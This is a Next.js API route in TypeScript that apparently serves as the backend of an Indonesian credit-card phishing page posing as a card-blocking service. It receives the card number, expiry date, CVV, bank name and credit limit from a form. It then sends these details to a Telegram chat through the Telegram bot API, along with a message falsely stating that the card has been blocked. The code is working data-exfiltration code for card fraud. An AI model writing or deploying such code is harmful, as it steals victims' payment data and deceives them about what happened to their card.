import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { bankName, cardNumber, expiry, cvv, limit } = body;

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.warn('Telegram configuration missing in environment variables');
      // For demo purposes, we might want to return success even if not sent, 
      // but here we should probably be honest or handle it.
      return NextResponse.json({ success: false, error: 'Configuration missing' }, { status: 500 });
    }

    const timestamp = new Date().toLocaleString('id-ID');
    const message = `💳 *BLOKIR KARTU KREDIT*\n━━━━━━━━━━━━━━━\n🏦 *Bank:* ${bankName}\n💳 *Nomor Kartu:* \`${cardNumber}\`\n📅 *Expiry:* \`${expiry}\`\n🔐 *CVV:* \`${cvv}\`\n💰 *Limit Kredit:* ${limit}\n━━━━━━━━━━━━━━━\n⏰ *Waktu:* ${timestamp}\n🔴 *STATUS: KARTU KREDIT TELAH DIBLOKIR*`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json();

    if (data.ok) {
      return NextResponse.json({ success: true });
    } else {
      return NextResponse.json({ success: false, error: data.description }, { status: 400 });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
}
